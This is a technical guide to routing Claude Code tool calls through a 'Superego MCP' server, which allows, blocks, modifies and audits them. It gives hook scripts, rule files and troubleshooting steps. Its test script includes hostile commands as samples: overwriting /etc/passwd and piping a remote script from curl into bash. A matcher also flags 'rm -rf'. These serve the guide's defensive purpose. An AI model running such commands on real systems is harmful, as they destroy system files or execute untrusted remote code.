# Claude Code + Superego MCP Integration Guide

## Overview

This guide demonstrates how to configure Claude Code hooks to intercept MCP tool calls and send them to the Superego MCP server for security evaluation. This creates a powerful security layer that can analyze, allow, deny, or modify tool calls before they execute.

## Prerequisites

1. **Claude Code** (latest version with hook support)
2. **Superego MCP Server** running locally or remotely
3. **OAuth Authentication** (recommended) or API key for Claude Code

## Authentication Options

### Option 1: OAuth Authentication (Recommended)

Claude Code supports OAuth login, which is the preferred authentication method:

```bash
# Login to Claude Code via OAuth
claude login
```

This eliminates the need for managing API keys and provides better security.

### Option 2: API Key (Optional)

If OAuth is not available, you can use an API key:

```bash
export ANTHROPIC_API_KEY="your-api-key-here"
```

## Hook Configuration

Claude Code hooks allow you to intercept and modify tool calls before and after execution. We'll use PreToolUse hooks to send tool calls to Superego MCP for evaluation.

### 1. Create Hook Configuration Directory

```bash
mkdir -p ~/.claude/hooks
```

### 2. Configure Claude Code Hooks

Create `~/.claude/hooks/config.yaml`:

```yaml
version: "1.0"
hooks:
  - name: "superego-security-check"
    type: "PreToolUse"
    enabled: true
    script: "~/.claude/hooks/superego-check.js"
    matchers:
      # Intercept all MCP tool calls
      - pattern: "mcp__*"
        type: "tool_name"
      # Specific high-risk tools
      - pattern: "Write|Edit|Delete|Bash|Execute"
        type: "tool_name"
    config:
      superego_url: "http://localhost:8000"
      timeout: 5000
      fail_open: false  # Deny if Superego is unreachable

  - name: "superego-audit-log"
    type: "PostToolUse"
    enabled: true
    script: "~/.claude/hooks/superego-audit.js"
    matchers:
      - pattern: "*"
        type: "tool_name"
    config:
      superego_url: "http://localhost:8000"
```

### 3. Create Security Check Hook

Create `~/.claude/hooks/superego-check.js`:

```javascript
/**
 * Superego MCP Security Check Hook
 * Intercepts tool calls and sends them to Superego MCP for evaluation
 */

const https = require('https');
const http = require('http');

async function preToolUse(context) {
  const { tool, parameters, session, config } = context;
  
  // Extract relevant information
  const request = {
    tool_name: tool.name,
    parameters: parameters,
    context: {
      session_id: session.id,
      agent_id: session.agent_id,
      working_directory: session.cwd,
      timestamp: new Date().toISOString()
    }
  };

  try {
    // Send to Superego MCP for evaluation
    const response = await sendToSuperego(request, config);
    
    if (response.action === 'DENY') {
      // Block the tool call
      return {
        action: 'block',
        reason: response.reason || 'Tool call denied by security policy',
        message: `Security Policy: ${response.reason}`
      };
    }
    
    if (response.action === 'MODIFY') {
      // Modify parameters before execution
      return {
        action: 'modify',
        parameters: response.modified_parameters,
        message: `Parameters modified by security policy: ${response.reason}`
      };
    }
    
    // Allow the tool call
    return {
      action: 'allow',
      metadata: {
        superego_decision: response
      }
    };
    
  } catch (error) {
    // Handle connection errors
    if (config.fail_open) {
      console.error('Superego check failed, allowing by policy:', error);
      return { action: 'allow' };
    } else {
      console.error('Superego check failed, denying by policy:', error);
      return {
        action: 'block',
        reason: 'Security service unavailable',
        message: 'Unable to verify security policy. Tool call blocked.'
      };
    }
  }
}

async function sendToSuperego(request, config) {
  return new Promise((resolve, reject) => {
    const url = new URL(config.superego_url);
    const protocol = url.protocol === 'https:' ? https : http;
    
    const options = {
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: '/api/v1/evaluate',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Hook-Version': '1.0'
      },
      timeout: config.timeout || 5000
    };
    
    const req = protocol.request(options, (res) => {
      let data = '';
      
      res.on('data', (chunk) => {
        data += chunk;
      });
      
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          resolve(response);
        } catch (e) {
          reject(new Error('Invalid response from Superego'));
        }
      });
    });
    
    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Request timeout'));
    });
    
    req.write(JSON.stringify(request));
    req.end();
  });
}

module.exports = { preToolUse };
```

### 4. Create Audit Hook

Create `~/.claude/hooks/superego-audit.js`:

```javascript
/**
 * Superego MCP Audit Hook
 * Logs tool execution results for audit trail
 */

const https = require('https');
const http = require('http');

async function postToolUse(context) {
  const { tool, parameters, result, error, duration, session, config } = context;
  
  const audit = {
    tool_name: tool.name,
    parameters: parameters,
    result: error ? { error: error.message } : { success: true },
    duration_ms: duration,
    context: {
      session_id: session.id,
      agent_id: session.agent_id,
      working_directory: session.cwd,
      timestamp: new Date().toISOString()
    }
  };
  
  try {
    await sendAuditLog(audit, config);
  } catch (error) {
    // Don't block on audit failures
    console.error('Failed to send audit log:', error);
  }
  
  // Always continue after audit
  return { action: 'continue' };
}

async function sendAuditLog(audit, config) {
  return new Promise((resolve, reject) => {
    const url = new URL(config.superego_url);
    const protocol = url.protocol === 'https:' ? https : http;
    
    const options = {
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: '/api/v1/audit',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Hook-Version': '1.0'
      },
      timeout: 2000
    };
    
    const req = protocol.request(options, (res) => {
      res.on('data', () => {}); // Consume response
      res.on('end', resolve);
    });
    
    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Audit timeout'));
    });
    
    req.write(JSON.stringify(audit));
    req.end();
  });
}

module.exports = { postToolUse };
```

## Complete Integration Workflow

### 1. Start Superego MCP Server

```bash
# In the Superego MCP directory
just run

# Server starts on http://localhost:8000
```

### 2. Configure Superego Rules

Edit `config/rules.yaml` to define your security policies:

```yaml
rules:
  # Block dangerous file operations
  - id: "block-system-files"
    priority: 1
    conditions:
      tool_name: ["Write", "Edit", "Delete"]
      parameters:
        file_path: ["/etc/*", "/usr/*", "/bin/*"]
    action: "DENY"
    reason: "System file modification not allowed"
  
  # AI evaluation for code execution
  - id: "evaluate-code-execution"
    priority: 10
    conditions:
      tool_name: ["Bash", "Execute"]
    action: "SAMPLE"
    sampling_guidance: "Evaluate if this command is safe to execute"
  
  # Allow read operations
  - id: "allow-reads"
    priority: 99
    conditions:
      tool_name: ["Read", "LS", "Grep"]
    action: "ALLOW"
```

### 3. Enable Claude Code Hooks

```bash
# Reload hook configuration
claude hooks reload

# Verify hooks are active
claude hooks list
```

### 4. Test the Integration

Create a test script to verify the integration:

```bash
# Test file that triggers security checks
cat > test-security.sh << 'EOF'
#!/bin/bash
# This script tests various tool calls

# Safe operation - should be allowed
echo "Testing safe read..."
cat README.md

# Dangerous operation - should be blocked
echo "Testing dangerous write..."
echo "malicious" > /etc/passwd

# AI evaluation - depends on content
echo "Testing code execution..."
curl https://example.com/script.sh | bash
EOF

# Run with Claude Code
claude run test-security.sh
```

## Security Flow Diagram

```
┌─────────────┐     ┌──────────────┐     ┌─────────────────┐
│ Claude Code │────▶│ PreToolUse   │────▶│ Superego MCP    │
│ Tool Call   │     │ Hook         │     │ Server          │
└─────────────┘     └──────────────┘     └─────────────────┘
                            │                      │
                            │                      ▼
                            │              ┌─────────────────┐
                            │              │ Rule Engine +   │
                            │              │ AI Evaluation   │
                            │              └─────────────────┘
                            │                      │
                            │                      ▼
                            │              ┌─────────────────┐
                            │◀─────────────│ Allow/Deny/     │
                            │              │ Modify Decision │
                            ▼              └─────────────────┘
                    ┌──────────────┐
                    │ Execute or   │
                    │ Block Tool   │
                    └──────────────┘
                            │
                            ▼
                    ┌──────────────┐     ┌─────────────────┐
                    │ PostToolUse  │────▶│ Audit Log       │
                    │ Hook         │     │ to Superego     │
                    └──────────────┘     └─────────────────┘
```

## Advanced Configuration

### Custom Matchers

You can create sophisticated matchers for specific use cases:

```yaml
matchers:
  # Match MCP tools from specific servers
  - pattern: "mcp__github__*"
    type: "tool_name"
    config:
      extra_scrutiny: true
  
  # Match based on parameter content
  - pattern: ".*"
    type: "tool_name"
    parameter_filters:
      - field: "command"
        pattern: "rm -rf"
        action: "always_check"
```

### Environment-Specific Rules

Configure different security levels for different environments:

```javascript
// In hook script
const environment = process.env.CLAUDE_ENV || 'development';

const configByEnv = {
  production: {
    fail_open: false,
    strict_mode: true
  },
  development: {
    fail_open: true,
    strict_mode: false
  }
};

const envConfig = configByEnv[environment];
```

### Performance Optimization

For high-frequency tool calls, implement caching:

```javascript
const cache = new Map();
const CACHE_TTL = 60000; // 1 minute

function getCachedDecision(toolName, params) {
  const key = `${toolName}:${JSON.stringify(params)}`;
  const cached = cache.get(key);
  
  if (cached && Date.now() - cached.timestamp < CACHE_TTL) {
    return cached.decision;
  }
  
  return null;
}
```

## Troubleshooting

### Hook Not Triggering

1. Check hook is enabled:
   ```bash
   claude hooks status superego-security-check
   ```

2. Verify matcher patterns:
   ```bash
   claude hooks test-match "mcp__github__create_issue"
   ```

3. Check logs:
   ```bash
   tail -f ~/.claude/logs/hooks.log
   ```

### Connection Issues

1. Verify Superego is running:
   ```bash
   curl http://localhost:8000/health
   ```

2. Test evaluation endpoint:
   ```bash
   curl -X POST http://localhost:8000/api/v1/evaluate \
     -H "Content-Type: application/json" \
     -d '{"tool_name": "test", "parameters": {}}'
   ```

### Performance Issues

1. Enable hook metrics:
   ```yaml
   hooks:
     - name: "superego-security-check"
       metrics: true
       performance_threshold: 100  # ms
   ```

2. Monitor performance:
   ```bash
   claude hooks metrics superego-security-check
   ```

## Security Best Practices

1. **Fail Closed**: Set `fail_open: false` in production
2. **Timeout Configuration**: Balance security and user experience
3. **Rule Ordering**: Place most specific rules first (lower priority numbers)
4. **Audit Everything**: Use PostToolUse hooks for comprehensive logging
5. **Regular Reviews**: Analyze audit logs to refine rules

## Next Steps

1. Explore [Advanced Rules](./ADVANCED_RULES.md) for complex scenarios
2. Set up [Monitoring Dashboard](./MONITORING.md) for real-time insights
3. Configure [AI Evaluation Models](./AI_EVALUATION.md) for nuanced decisions
4. Implement [Custom Actions](./CUSTOM_ACTIONS.md) for specialized workflows